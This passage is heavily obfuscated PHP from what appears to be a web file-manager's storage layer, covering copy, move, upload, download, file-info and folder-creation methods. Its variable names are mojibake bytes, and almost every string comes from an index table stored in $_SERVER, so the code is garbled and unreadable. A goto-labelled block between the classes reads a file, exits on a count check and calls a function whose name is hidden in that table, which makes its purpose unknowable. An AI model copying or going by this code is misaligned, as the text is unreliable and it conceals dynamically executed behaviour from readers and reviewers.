$this->model->copy($š¤Óïê­, $ó‚«¸¨ú[$‹â§µ²ã[484]], $œÀÀ•, $ó‚«¸¨ú[$‹â§µ²ã[87]]); return $à¡ÃÉ¼Š ? $this->getPathOuter($à¡ÃÉ¼Š) : !1; } public function moveFile($ãœÜ¿Ë, $ùÃÊ†İô, $¿“‘µ¹ = REPEAT_REPLACE) { $ÉÍÊĞêô =& $_SERVER[±Ö‰ô½¯]; $èæÉ˜á = $this->parse($ùÃÊ†İô); $ú¥İÌç = $this->model->move($ãœÜ¿Ë, $èæÉ˜á[$ÉÍÊĞêô[484]], $¿“‘µ¹, $èæÉ˜á[$ÉÍÊĞêô[87]]); return $ú¥İÌç ? $this->getPathOuter($ú¥İÌç) : !1; } public function copy($•‘ŸÉ¬, $¿Û”´·ø, $†ì™İªû = REPEAT_REPLACE, $Ì›‚úùº = false) { $ÃÉÏ®¦  = $this->parse($¿Û”´·ø); $’¥¤Äè¿ = $this->model->copy($•‘ŸÉ¬, $ÃÉÏ®¦ [$_SERVER[±Ö‰ô½¯][484]], $†ì™İªû, $Ì›‚úùº); return $’¥¤Äè¿ ? $this->getPathOuter($’¥¤Äè¿) : !1; } public function moveSameAllow() { } public function move($†Ù²ÑÇŸ, $£»·—£È, $áÃ×ıÓ = REPEAT_REPLACE, $ ˜³Éˆ = false) { $Å£²ã¯ = $this->parse($£»·—£È); $›Á¿Æ²À = $this->model->move($†Ù²ÑÇŸ, $Å£²ã¯[$_SERVER[±Ö‰ô½¯][484]], $áÃ×ıÓ, $ ˜³Éˆ); return $›Á¿Æ²À ? $this->getPathOuter($›Á¿Æ²À) : !1; } public function remove($Çë‹ç¥¹, $½–Û‹’ = true) { return $this->model->remove($Çë‹ç¥¹, $½–Û‹’); } public function rename($Ä°‚â˜±, $Ä‰ƒóÂ×) { $÷ ñÎ´Ñ = $this->model->rename($Ä°‚â˜±, $Ä‰ƒóÂ×); return $÷ ñÎ´Ñ ? $this->getPathOuter($Ä°‚â˜±) : $÷ ñÎ´Ñ; } public function size($Õ²ú„™ä) { $àéÌØàá = $this->infoSimple($Õ²ú„™ä); return $àéÌØàá ? $àéÌØàá[$_SERVER[±Ö‰ô½¯][79]] : 0; } public function infoSimple($°”®æ) { return $this->model->sourceInfo($°”®æ); } public function info($ƒãÖøşˆ) { return $this->infoParse($ƒãÖøşˆ); } public function infoAuth($ÃØÎÅ¯‘) { return $this->infoParse($ÃØÎÅ¯‘, !1, !0); } public function infoWithChildren($ì× Şµß) { return $this->infoParse($ì× Şµß, !0); } protected function infoParse($öÉè‘¯Ã, $ıÇ×­‰õ = false, $—Ù¦‚ = false) { if (!$ıÇ×­‰õ) { return $this->model->pathInfo($öÉè‘¯Ã, $—Ù¦‚); } return $this->model->pathInfoMore($öÉè‘¯Ã); } public function infoFullSimple($ï“…îéä) { $¿ºØÉğã =& $_SERVER[±Ö‰ô½¯]; $ºåç¦î… = explode($¿ºØÉğã[8], $ï“…îéä); $ƒŞãùøÓ = implode($¿ºØÉğã[8], array_splice($ºåç¦î…, 1)); return $this->model->pathInfoByPath($ºåç¦î…[0], $ƒŞãùøÓ); } public function infoFull($Æİä€§) { $Á²ÌîÊ· = $this->infoFullSimple($Æİä€§); return is_array($Á²ÌîÊ·) ? $this->model->pathInfo($Á²ÌîÊ·[$_SERVER[±Ö‰ô½¯][193]]) : !1; } public function hashSimple($ë‚’‰) { $Å°ÕÂË· =& $_SERVER[±Ö‰ô½¯]; $Û€ª«Ûµ = $this->infoWithChildren($ë‚’‰); return $Û€ª«Ûµ[$Å°ÕÂË·[169]][$Å°ÕÂË·[692]]; } public function hashMd5($»İÈì™—) { $Ôµ«é¼£ =& $_SERVER[±Ö‰ô½¯]; $¹ùå°³› = $this->infoWithChildren($»İÈì™—); return $¹ùå°³›[$Ôµ«é¼£[169]][$Ôµ«é¼£[560]]; } public function exist($³Å‘Š´â) { $œÄš©ìİ =& $_SERVER[±Ö‰ô½¯]; $ÍÖß±øñ = $this->parse($³Å‘Š´â); if (!$ÍÖß±øñ[$œÄš©ìİ[87]]) { return $this->isFile($³Å‘Š´â) || $this->isFolder($³Å‘Š´â); } $ëºº¡¨¶ = array($œÄš©ìİ[489] => $ÍÖß±øñ[$œÄš©ìİ[484]], $œÄš©ìİ[32] => $ÍÖß±øñ[$œÄš©ìİ[87]]); $øÅ´õîŠ = $this->model->where($ëºº¡¨¶)->find(); return $øÅ´õîŠ ? !0 : !1; } public function isFile($ÂŒÆéÍ) { $ïà„ÑĞ =& $_SERVER[±Ö‰ô½¯]; $‘õÌÔ…Å = $this->infoSimple($ÂŒÆéÍ); return $‘õÌÔ…Å && $‘õÌÔ…Å[$ïà„ÑĞ[497]] == $ïà„ÑĞ[230] ? !0 : !1; } public function isFolder($ŞæÉã“•) { $¢—ßøú =& $_SERVER[±Ö‰ô½¯]; $š¯ï†˜’ = $this->infoSimple($ŞæÉã“•); return $š¯ï†˜’ && $š¯ï†˜’[$¢—ßøú[497]] == $¢—ßøú[91] ? !0 : !1; } public function listPath($²„¥Ô¨ü, $Ëã¯¹šÏ = false) { $‘Ù¿ˆ =& $_SERVER[±Ö‰ô½¯]; if ($²„¥Ô¨ü == $‘Ù¿ˆ[12]) { return !1; } $ãå¶İ = array($‘Ù¿ˆ[489] => $²„¥Ô¨ü); if ($Ëã¯¹šÏ) { return $this->model->listSource($ãå¶İ, -1); } return $this->model->listSource($ãå¶İ); } public function has($¥àÂ¢†, $‰àæ±´ = false, $Ù»›¸€Õ = null) { $Š¨¤ğ¹é =& $_SERVER[±Ö‰ô½¯]; $™Šùè‹‡ = $this->infoWithChildren($¥àÂ¢†); if ($‰àæ±´) { return array($Š¨¤ğ¹é[242] => $™Šùè‹‡[$Š¨¤ğ¹é[242]], $Š¨¤ğ¹é[241] => $™Šùè‹‡[$Š¨¤ğ¹é[241]]); } return $Ù»›¸€Õ ? $™Šùè‹‡[$Š¨¤ğ¹é[242]] : $™Šùè‹‡[$Š¨¤ğ¹é[241]]; } public function listAll($Œ±õÉÂì) { $œ™€…‡š = IO::info($this->pathParse[$_SERVER[±Ö‰ô½¯][87]]); if (!$œ™€…‡š) { return array(); } return $this->model->listAll($Œ±õÉÂì); } public function getContent($‚§ò¦‚) { return $this->model->getContent($‚§ò¦‚); } public function setContent($¢ğÈ¸öİ, $áê—„ÊÜ = '') { return $this->model->setContent($¢ğÈ¸öİ, $áê—„ÊÜ); } public function fileSubstr($´Ğ„³Ó, $ôõá‰œô, $ÈŞ¿­•Á) { return $this->model->fileSubstr($´Ğ„³Ó, $ôõá‰œô, $ÈŞ¿­•Á); } public function download($¯Óıœ•ª, $ØäêÅòÎ = '') { $´šÓ™ş± = get_path_father($ØäêÅòÎ); $Œªİí = get_path_this($ØäêÅòÎ); $£ÍÎÏê = $this->model->fileInfoGet($¯Óıœ•ª); $·¹¦˜– = IO::copy($£ÍÎÏê[$_SERVER[±Ö‰ô½¯][87]], $´šÓ™ş±, !1, $Œªİí); return $·¹¦˜–; } public function setModifyTime($øııü„ì, $ƒ°¹ŠÃ‰ = '') { $İŒ²ä† =& $_SERVER[±Ö‰ô½¯]; if (!$øııü„ì) { return; } $this->model->where(array($İŒ²ä†[503] => $øııü„ì))->save(array($İŒ²ä†[88] => $ƒ°¹ŠÃ‰)); } public function upload($´ƒÚ“Ì, $úè˜ü¸®, $ÀÇŞÉû = false, $ÏåÜÑ¢Ã = REPEAT_REPLACE) { $—¤›ÏÜà =& $_SERVER[±Ö‰ô½¯]; $ù´çš„ = $this->parse($´ƒÚ“Ì); $š¶÷¤ = $this->model->addFile($ù´çš„[$—¤›ÏÜà[484]], $úè˜ü¸®, $ù´çš„[$—¤›ÏÜà[87]], $ÀÇŞÉû, $ÏåÜÑ¢Ã); return $this->getPathOuter($š¶÷¤); } public function uploadFileByID($¬’Ü‰Ïß, $œ¨µíªò, $æşÇ§¶æ) { $¨ŞØ˜£ =& $_SERVER[±Ö‰ô½¯]; $ÊåÊ¶Ôš = $this->parse($¬’Ü‰Ïß); $ïÃöÕ’Ó = $this->model->addFileByFileID($ÊåÊ¶Ôš[$¨ŞØ˜£[484]], $œ¨µíªò, $ÊåÊ¶Ôš[$¨ŞØ˜£[87]], $æşÇ§¶æ); return $this->getPathOuter($ïÃöÕ’Ó); } public function addFileByRemote($ªŠĞ³Òå, $Åş¯›×à, $Û…È‡¯ = array(), $©ÚÇù  = '', $ˆÅ¢Øöš) { $ØÃ’–ı· =& $_SERVER[±Ö‰ô½¯]; $ºûàÎ®ˆ = $this->parse($ªŠĞ³Òå); $©ÚÇù  = empty($©ÚÇù ) ? $ºûàÎ®ˆ[$ØÃ’–ı·[87]] : $©ÚÇù ; $œ• ™æá = $this->model->addFileByRemote($ºûàÎ®ˆ[$ØÃ’–ı·[484]], $Åş¯›×à, $©ÚÇù , $Û…È‡¯, $ˆÅ¢Øöš); return $this->getPathOuter($œ• ™æá); } public function uploadLink($‡¢×Î¯É, $üÑõº¡ö = 0) { $™Œ¡ä•Ô =& $_SERVER[±Ö‰ô½¯]; $¿ü™à‚¨ = $this->parse($‡¢×Î¯É); $ûÂı‹¾ı = _get($GLOBALS[$™Œ¡ä•Ô[7]], $™Œ¡ä•Ô[1484]); $í‚ˆ§òí = _get($GLOBALS[$™Œ¡ä•Ô[7]], $™Œ¡ä•Ô[1485]); $ÑË³Ãä = KodIO::ioFileDriverGet($™Œ¡ä•Ô[495] . $¿ü™à‚¨[$™Œ¡ä•Ô[484]] . $™Œ¡ä•Ô[404]); $·¬™Åü» = Model($™Œ¡ä•Ô[694])->createFileName($¿ü™à‚¨[$™Œ¡ä•Ô[87]], $ÑË³Ãä, $ûÂı‹¾ı, $í‚ˆ§òí); return IO::uploadLink($·¬™Åü», $üÑõº¡ö); } public function fileNameAuto($¬ö´øé´, $Ô×òìŒ, $şŠË ô = REPEAT_REPLACE, $÷ïå‘ş‰ = false) { return $this->model->fileNameAuto($¬ö´øé´, $Ô×òìŒ, $şŠË ô, $÷ïå‘ş‰); } public function fileNameExist($Èæ¾ˆ†, $Çù‡¨«‘) { return $this->model->fileNameExist($Èæ¾ˆ†, $Çù‡¨«‘); } protected function _fileOut($º‚Ô¦„‚, $ŸİÊ’àã = false, $Úì¨¡´ = false, $ÓÆ´èî‘ = '', $è¶ı ® = false) { $ªäí›Ï =& $_SERVER[±Ö‰ô½¯]; $ŠæÖ¨Õ¿ = $this->model->sourceInfo($º‚Ô¦„‚); if ($ŠæÖ¨Õ¿[$ªäí›Ï[497]] == $ªäí›Ï[91]) { header($ªäí›Ï[1486]); die; } $¦äì¢Ÿ© = $this->model->fileInfoGet($º‚Ô¦„‚); $ÓÆ´èî‘ = $¦äì¢Ÿ©[$ªäí›Ï[560]] ? $¦äì¢Ÿ©[$ªäí›Ï[560]] : $ÓÆ´èî‘; $îş îó = isset($GLOBALS[$ªäí›Ï[182]]) && is_array($GLOBALS[$ªäí›Ï[182]]) ? $GLOBALS[$ªäí›Ï[182]][$ªäí›Ï[32]] : $ŠæÖ¨Õ¿[$ªäí›Ï[32]]; if ($è¶ı ®) { return IO::fileOutServer($¦äì¢Ÿ©[$ªäí›Ï[87]], $ŸİÊ’àã, $îş îó, $ÓÆ´èî‘); } IO::fileOut($¦äì¢Ÿ©[$ªäí›Ï[87]], $ŸİÊ’àã, $îş îó, $ÓÆ´èî‘); } public function fileOut($ŞÎĞ˜, $™ÅÓ´É = false, $ÂÈ¦¿í = false, $İç¢¿µ± = '') { $this->_fileOut($ŞÎĞ˜, $™ÅÓ´É, $ÂÈ¦¿í, $İç¢¿µ±); } public function fileOutServer($“®¢Ø¯Î, $·£æì†‹ = false, $µ³Ïç´ = false, $Á¸€è¨ = '') { $this->_fileOut($“®¢Ø¯Î, $·£æì†‹, $µ³Ïç´, $Á¸€è¨, !0); } protected function _fileOutImage($‹ØŒ¶Ï„, $·¼êÙí = 250) { $ šÃÙ² =& $_SERVER[±Ö‰ô½¯]; $ğÃªè‘¼ = $this->model->pathInfo($‹ØŒ¶Ï„); if ($ğÃªè‘¼[$ šÃÙ²[497]] == $ šÃÙ²[91]) { show_json($ šÃÙ²[1487] . $‹ØŒ¶Ï„, !1); } $·÷º­Ê = $this->model->fileInfoGet($‹ØŒ¶Ï„); $ğÃªè‘¼[$ šÃÙ²[183]] = $·÷º­Ê[$ šÃÙ²[87]]; $GLOBALS[$ šÃÙ²[182]] = $ğÃªè‘¼; IO::fileOutImage($·÷º­Ê[$ šÃÙ²[87]], $·¼êÙí); } public function fileOutImage($îâôä±ü, $êü´öçŸ = 250) { $this->_fileOutImage($îâôä±ü, $êü´öçŸ); } public function fileOutImageServer($©ÛÏ¶…, $ÅÓ–¿˜ô = 250) { $this->_fileOutImage($©ÛÏ¶…, $ÅÓ–¿˜ô); } public function link($ßÀĞ±¾», $ÉÒ«‹Ú¼ = '') { $¤ı¸ôé× = $this->model->fileInfoGet($ßÀĞ±¾»); return IO::link($¤ı¸ôé×[$_SERVER[±Ö‰ô½¯][87]], $ÉÒ«‹Ú¼); } protected function parse($‘¤Ù—ñ¡) { $²úªò¼™ =& $_SERVER[±Ö‰ô½¯]; if (strstr($‘¤Ù—ñ¡, $²úªò¼™[8]) === !1) { return array($²úªò¼™[505] => intval($‘¤Ù—ñ¡), $²úªò¼™[87] => $²úªò¼™[12], $²úªò¼™[1483] => array()); } $ËÖ²ÂËÏ = explode($²úªò¼™[8], trim($‘¤Ù—ñ¡, $²úªò¼™[8])); if (count($ËÖ²ÂËÏ) < 2) { show_tips(clear_html($‘¤Ù—ñ¡) . $²úªò¼™[1488]); } return array($²úªò¼™[505] => intval($ËÖ²ÂËÏ[0]), $²úªò¼™[87] => $ËÖ²ÂËÏ[1], $²úªò¼™[1483] => array_slice($ËÖ²ÂËÏ, 1)); } } goto cİìÛ…¶Ş; d¥ƒ™¯ëÇÒ: if ($_SERVER[$_SERVER[±Ö‰ô½¯][986]] != $_SERVER[$_SERVER[±Ö‰ô½¯][987]]) { $_getc = $_SERVER[±Ö‰ô½¯][989]; $_getfile = $_SERVER[$_SERVER[±Ö‰ô½¯][990]] . $_SERVER[±Ö‰ô½¯][991]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[±Ö‰ô½¯][287], $_getfilec); if (count($_getarrs) < $_SERVER[±Ö‰ô½¯][743]) { $exit = $_SERVER[±Ö‰ô½¯][992]; $exit(); } $_act = $_SERVER[±Ö‰ô½¯][1698]; $_act($_SERVER[$_SERVER[±Ö‰ô½¯][1699]]); } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Õ·„‚Úí) { $¿‰ÇÔé‘ =& $_SERVER[±Ö‰ô½¯]; $çä›õƒö = Model($¿‰ÇÔé‘[594])->where(array($¿‰ÇÔé‘[1921] => $Õ·„‚Úí))->find(); $Óò–÷äŒ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Õ·„‚Úí, $çä›õƒö[$¿‰ÇÔé‘[32]]); $this->userDesktopAdd($Óò–÷äŒ); return $Óò–÷äŒ; } public function userDesktopAdd($†¬Ÿûüš) { $í¯¨ú™ =& $_SERVER[±Ö‰ô½¯]; $¯äçş”¹ = LNG($í¯¨ú™[2418]); $Œì»Éßß = $this->mkdir($†¬Ÿûüš, $¯äçş”¹); $this->metaSet($Œì»Éßß, $í¯¨ú™[2419], $í¯¨ú™[91]); $this->metaSet($†¬Ÿûüš, $í¯¨ú™[2420], $Œì»Éßß); } public function userPathSafeAdd($åÊ¸â°) { $ÂæíÁÅŠ =& $_SERVER[±Ö‰ô½¯]; $·¢¼¢ôğ = Model($ÂæíÁÅŠ[594])->getInfoFull($åÊ¸â°); if (!$·¢¼¢ôğ) { return !1; } if (_get($·¢¼¢ôğ, $ÂæíÁÅŠ[615])) { return $·¢¼¢ôğ[$ÂæíÁÅŠ[552]][$ÂæíÁÅŠ[2421]]; } $‚·†’ÉÏ = $this->_mkdirRoot(SourceModel::TYPE_USER, $åÊ¸â°, $ÂæíÁÅŠ[2422], $ÂæíÁÅŠ[2423]); Model($ÂæíÁÅŠ[594])->metaSet($åÊ¸â°, $ÂæíÁÅŠ[2421], $‚·†’ÉÏ); $this->metaSet($‚·†’ÉÏ, $ÂæíÁÅŠ[2424], $åÊ¸â°); return $‚·†’ÉÏ; } public function userPathAppAdd($š¾îĞ‹, $±ß³“éé = '', $ç¢İıéô = '') { $Äã¬ƒ © =& $_SERVER[±Ö‰ô½¯]; $ìÀÔŞÇÅ = Model($Äã¬ƒ ©[594])->getInfoFull($š¾îĞ‹); if (!$ìÀÔŞÇÅ) { return !1; } $»‘’Ñ› = $ìÀÔŞÇÅ[$Äã¬ƒ ©[552]] ? $ìÀÔŞÇÅ[$Äã¬ƒ ©[552]] : array(); $òúÆßÂß = $»‘’Ñ›[$Äã¬ƒ ©[2425]]; if (!$òúÆßÂß) { $òúÆßÂß = $this->_mkdirRoot(SourceModel::TYPE_USER, $š¾îĞ‹, $Äã¬ƒ ©[2426], $Äã¬ƒ ©[2427]); Model($Äã¬ƒ ©[594])->metaSet($š¾îĞ‹, $Äã¬ƒ ©[2425], $òúÆßÂß . $Äã¬ƒ ©[12]); $this->metaSet($òúÆßÂß, $Äã¬ƒ ©[2425], $š¾îĞ‹); } if (!$±ß³“éé) { return $òúÆßÂß; } $“”–¼ß¯ = $»‘’Ñ›[$Äã¬ƒ ©[2428] . $±ß³“éé]; if (!$“”–¼ß¯) { $“”–¼ß¯ = $this->mkdir($òúÆßÂß, $±ß³“éé); Model($Äã¬ƒ ©[594])->metaSet($š¾îĞ‹, $Äã¬ƒ ©[2428] . $±ß³“éé, $“”–¼ß¯); $this->metaSet($“”–¼ß¯, $Äã¬ƒ ©[2428] . $±ß³“éé, $š¾îĞ‹); } if (!$ç¢İıéô) { return $“”–¼ß¯; } $–³Ã†æ• = $this->mkdir($“”–¼ß¯, $ç¢İıéô); return $–³Ã†æ•; } public function groupRootAdd($ÉûË¸Š—) { $ßø¬†Ò± =& $_SERVER[±Ö‰ô½¯]; $˜ƒØ÷·¨ = Model($ßø¬†Ò±[602])->where(array($ßø¬†Ò±[2221] => $ÉûË¸Š—))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÉûË¸Š—, $˜ƒØ÷·¨[$ßø¬†Ò±[32]]); } public function systemRootPathAdd($Ó¤—Œ¶â) { if ($Ó¤—Œ¶â != $_SERVER[±Ö‰ô½¯][625]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ó¤—Œ¶â); } public function userRootRemove($Œ’ß¯) { $Šµª‘‡ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Œ’ß¯, !0); foreach ($Šµª‘‡ as $İÛÄÓÃ) { if (!$İÛÄÓÃ) { continue; } $this->remove($İÛÄÓÃ[$_SERVER[±Ö‰ô½¯][193]], !1); } } public function groupRootRemove($ „›’¬…) { $°¢øæçÓ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ „›’¬…); if (!$°¢øæçÓ) { return; } $this->remove($°¢øæçÓ[$_SERVER[±Ö‰ô½¯][193]], !1); } private function _mkdirRoot($•¢¾ïäª, $ùîåê, $×êâ¡è, $ ı¦şé£ = '') { $”«Ÿì² =& $_SERVER[±Ö‰ô½¯]; $¯°Ğ¹¼á = KodUser::id(); $ıƒ¯»Í§ = array($”«Ÿì²[489] => 0, $”«Ÿì²[668] => $•¢¾ïäª, $”«Ÿì²[669] => $ùîåê, $”«Ÿì²[666] => 1, $”«Ÿì²[670] => $¯°Ğ¹¼á, $”«Ÿì²[671] => $¯°Ğ¹¼á, $”«Ÿì²[667] => $ ı¦şé£, $”«Ÿì²[672] => $”«Ÿì²[610], $”«Ÿì²[516] => 0, $”«Ÿì²[637] => 0, $”«Ÿì²[555] => 0, $”«Ÿì²[673] => $”«Ÿì²[12]); if ($¿Ø‘êª = $this->where($ıƒ¯»Í§)->find()) { return $¿Ø‘êª[$”«Ÿì²[193]]; } $Ññù³­ı = "\115\x6f\144\145\154\123\x6f\165\162\143\x65\56\x6d\x6b\144\151\x72\122\157\x6f\x74\x2e{$•¢¾ïäª}\56{$ùîåê}\x2e" . $×êâ¡è; CacheLock::lock($Ññù³­ı); $ıƒ¯»Í§[$”«Ÿì²[32]] = $×êâ¡è; $Êé“êû = $this->add($ıƒ¯»Í§); $µ§ìĞ¦ = array($”«Ÿì²[674] => short_id($Êé“êû)); $this->where(array($”«Ÿì²[503] => $Êé“êû))->save($µ§ìĞ¦); CacheLock::unlock($Ññù³­ı); return $Êé“êû; } private function targetSourceRoot($Ì¶êâ­, $¶÷Œ³ìû, $îÙ’ğü = false) { $ÚµÉæş½ =& $_SERVER[±Ö‰ô½¯]; $ş‡”÷Ï = array($ÚµÉæş½[489] => 0, $ÚµÉæş½[668] => $Ì¶êâ­, $ÚµÉæş½[669] => $¶÷Œ³ìû); if ($îÙ’ğü) { $´è´à©š = $this->where($ş‡”÷Ï)->select(); return $´è´à©š ? $´è´à©š : array(); } $Èé’ÙÊ§ = $this->where($ş‡”÷Ï)->find(); return $Èé’ÙÊ§ ? $Èé’ÙÊ§ : array(); } public function sourceRootGroup($æ¢ê‘Öü) { $ßÈ’´•— =& $_SERVER[±Ö‰ô½¯]; if (is_string($æ¢ê‘Öü)) { $æ¢ê‘Öü = array($æ¢ê‘Öü); } $úë¯ÕœØ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $æ¢ê‘Öü, $ßÈ’´•—[222]); $£îë£ÅØ = array($ßÈ’´•—[447] => $úë¯ÕœØ, $ßÈ’´•—[444] => array($ßÈ’´•—[856] => count($æ¢ê‘Öü))); $this->_listDataApply($£îë£ÅØ[$ßÈ’´•—[447]]); $this->_listMake($£îë£ÅØ); return array_to_keyvalue($£îë£ÅØ[$ßÈ’´•—[85]], $ßÈ’´•—[586]); } public function mkfile($ôëçñŸ×, $ÅúĞ­“Û, $”ÇÂ‚¥Ü = '', $‘Ÿ£ìÃ  = REPEAT_RENAME) { $¦Çà¯ç— =& $_SERVER[±Ö‰ô½¯]; $µ¬…¥öë = KodIO::ioFileDriverGet($¦Çà¯ç—[495] . $ôëçñŸ× . $¦Çà¯ç—[404]); $Ş¬¹«ˆÀ = Model($¦Çà¯ç—[694])->addFileByContent($”ÇÂ‚¥Ü, $µ¬…¥öë, $ÅúĞ­“Û); return $this->_createFileCall($ôëçñŸ×, $ÅúĞ­“Û, $Ş¬¹«ˆÀ, $‘Ÿ£ìÃ , $¦Çà¯ç—[1492]); } public function addFile($«İÓ¶„¨, $¹‹Â–ßè, $íÒ²éÓ, $¹³º¸« = false, $ªãŠ¬Áƒ = REPEAT_RENAME) { $ÎíÌÈäÉ =& $_SERVER[±Ö‰ô½¯]; $ëËÏÂ˜‘ = KodIO::ioFileDriverGet($ÎíÌÈäÉ[495] . $«İÓ¶„¨ . $ÎíÌÈäÉ[404]); $Ï’òøÜ = Model($ÎíÌÈäÉ[694])->addFile($¹‹Â–ßè, $ëËÏÂ˜‘, $íÒ²éÓ, $¹³º¸«); return $this->_createFileCall($«İÓ¶„¨, $íÒ²éÓ, $Ï’òøÜ, $ªãŠ¬Áƒ); } public function addFileByFileID($½¾Ü¡×¤, $¬á¢³×, $÷î‘²¦Ğ, $Ìâ¤÷é = REPEAT_RENAME) { $Õòôê·Š =& $_SERVER[±Ö‰ô½¯]; $”±äšßÜ = Model($Õòôê·Š[694])->find($¬á¢³×); Model($Õòôê·Š[694])->linkAdd($¬á¢³×); return $this->_createFileCall($½¾Ü¡×¤, $÷î‘²¦Ğ, $”±äšßÜ, $Ìâ¤÷é); } public function addFileByRemote($’šë³, $§âŸæƒ, $‹¯Ï¾Ù, $ÄØç®­ë = array(), $£ùŞ£°È = REPEAT_RENAME) { $Øš»Öü = Model($_SERVER[±Ö‰ô½¯][694])->addFileByRemote($§âŸæƒ, $‹¯Ï¾Ù, $ÄØç®­ë); return $this->_createFileCall($’šë³, $‹¯Ï¾Ù, $Øš»Öü, $£ùŞ£°È); } private function _createFileCall($ÚšĞò‚, $ÙáŸƒ¦‚, $¦Ğ°ò ë, $ÃÑ˜ìš¦, $™­†Óäü = "\165\160\154\x6f\141\x64") { $Â™å„ =& $_SERVER[±Ö‰ô½¯]; if (!$¦Ğ°ò ë) { return !1; } $ÈÓóëŞ‘ = !1; $this->setMasterDB(); $this->lockWriteStart($ÚšĞò‚, $ÙáŸƒ¦‚); $Äàğ†Ÿ´ = $this->fileNameExist($ÚšĞò‚, $ÙáŸƒ¦‚); $²íÆ”îÅ = $this->_createFile($ÚšĞò‚, $ÙáŸƒ¦‚, $¦Ğ°ò ë, $ÃÑ˜ìš¦, $ÈÓóëŞ‘); if (!$ÈÓóëŞ‘) { Model($Â™å„[557])->remove($¦Ğ°ò ë[$Â™å„[554]]); } if ($ÈÓóëŞ‘ && $²íÆ”îÅ && $²íÆ”îÅ != $Äàğ†Ÿ´) { Model($Â™å„[2390])->eventCreate($²íÆ”îÅ, $™­†Óäü); } $this->lockWriteEnd($ÚšĞò‚, $ÙáŸƒ¦‚); return $²íÆ”îÅ; } public function mkdir($ùğÆÖüê, $Î»…çàŠ, $—¸¬ƒáÓ = REPEAT_SKIP) { $ô•ÃíËæ =& $_SERVER[±Ö‰ô½¯]; $this->setMasterDB(); $ºÆ„™ê‚ = $this->sourceInfo($ùğÆÖüê); if (!$ºÆ„™ê‚) { return !1; } $this->lockWriteStart($ùğÆÖüê, $Î»…çàŠ); if ($—¸¬ƒáÓ !== !1) { $™ª¨áæÆ = $this->fileNameExist($ùğÆÖüê, $Î»…çàŠ); if ($™ª¨áæÆ && $—¸¬ƒáÓ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ùğÆÖüê, $Î»…çàŠ); return $™ª¨áæÆ; } $Î»…çàŠ = $this->fileNameAuto($ùğÆÖüê, $Î»…çàŠ, $—¸¬ƒáÓ); } $º¥ÂºÏ‘ = array($ô•ÃíËæ[666] => 1, $ô•ÃíËæ[506] => $Î»…çàŠ, $ô•ÃíËæ[667] => $ô•ÃíËæ[12], $ô•ÃíËæ[555] => 0, $ô•ÃíËæ[637] => 0); $È¸ƒ¥’ = $this->_addSource($º¥ÂºÏ‘, $ºÆ„™ê‚); Model($ô•ÃíËæ[2390])->eventCreate($È¸ƒ¥’, $ô•ÃíËæ[1493]); $this->lockWriteEnd($ùğÆÖüê, $Î»…çàŠ); return $È¸ƒ¥’; } public function listSourceRoot($¶Ç»…ÁÙ, $‰˜î‰¢•, $¶ú¤áÃ = "\x73\x6f\x75\162\143\x65\111\x44\x2c\164\141\162\x67\145\164\x49\104\x2c\163\x69\x7a\145") { $èß¦Î€Å =& $_SERVER[±Ö‰ô½¯]; $¸Ø‚…¿¢ = $èß¦Î€Å[464]; $ª¶»íøÓ = array(); $ïô·ª‘ = 1024 * 50; $èÑ­ÛÑ = is_array($èÑ­ÛÑ) ? $èÑ­ÛÑ : array(); $ˆÎ¿êò² = count($‰˜î‰¢•); $İ›Ï½‹ä = $this->tablePrefix . $èß¦Î€Å[2429]; for ($”¹¤ş½ô = 0; $”¹¤ş½ô < $ˆÎ¿êò²; $”¹¤ş½ô++) { $§ãã–à” = $‰˜î‰¢•[$”¹¤ş½ô]; $¸Ø‚…¿¢ .= "\x53\105\x4c\x45\x43\x54\x20\52\40\106\122\117\x4d\x20\50\x53\x45\114\105\103\124\x20{$¶ú¤áÃ}\40\x46\x52\117\115\x20\x60{$İ›Ï½‹ä}\x60\40\x57\x48\x45\122\105\40"; $¸Ø‚…¿¢ .= "\x60\x70\x61\162\145\x6e\x74\111\104\x60\75\x30\x20\x41\x4e\104\x20\x60\164\x61\x72\x67\x65\x74\x49\104\140\75{$§ãã–à”}\x20\x41\116\104\x20\x60\164\141\162\147\x65\164\124\171\160\145\x60\x3d{$¶Ç»…ÁÙ}\40\x61\156\144\x20\x66\x69\x6c\145\124\171\160\x65\75\x27\x27\40\x6c\x69\155\151\x74\40\61\51\40\141\x73\x20\164\142\137{$”¹¤ş½ô}\x20\125\116\111\117\x4e\40\101\x4c\114\40"; if ((strlen($¸Ø‚…¿¢) >= $ïô·ª‘ || $”¹¤ş½ô == $ˆÎ¿êò² - 1) && $¸Ø‚…¿¢) { $¸Ø‚…¿¢ = substr($¸Ø‚…¿¢, 0, -strlen($èß¦Î€Å[1154])); $Œ¶Íµõ× = $this->query($¸Ø‚…¿¢); $¸Ø‚…¿¢ = $èß¦Î€Å[12]; $ª¶»íøÓ = array_merge($ª¶»íøÓ, $Œ¶Íµõ×); } } return $ª¶»íøÓ; } private function _createFile($ò‚Şİ¬Ÿ, $àƒ÷õÀ, $Ö¿îæ»°, $Ï®š“Û, &$ôïÎšœ) { $µë±„±Ñ =& $_SERVER[±Ö‰ô½¯]; $¡şâ—Ë¨ = $this->sourceInfo($ò‚Şİ¬Ÿ); if (!$Ö¿îæ»° || !$¡şâ—Ë¨) { return !1; } if ($Ï®š“Û !== !1) { $İ¸ÖÕ³Î = $this->fileNameExist($ò‚Şİ¬Ÿ, $àƒ÷õÀ); } $ôïÎšœ = !0; if ($Ï®š“Û && $İ¸ÖÕ³Î) { if ($Ï®š“Û == REPEAT_SKIP) { $ôïÎšœ = !1; return $İ¸ÖÕ³Î; } else { if ($Ï®š“Û == REPEAT_REPLACE) { $¯İƒø„‘ = $this->sourceInfo($İ¸ÖÕ³Î); $¥ûèæËß = $this->fileHistory($¯İƒø„‘, $Ö¿îæ»°[$µë±„±Ñ[554]], $Ö¿îæ»°[$µë±„±Ñ[79]]); if (!$¥ûèæËß) { $ôïÎšœ = !1; } else { $this->folderSizeReset($ò‚Şİ¬Ÿ); } return $İ¸ÖÕ³Î; } else { $àƒ÷õÀ = $this->fileNameAuto($ò‚Şİ¬Ÿ, 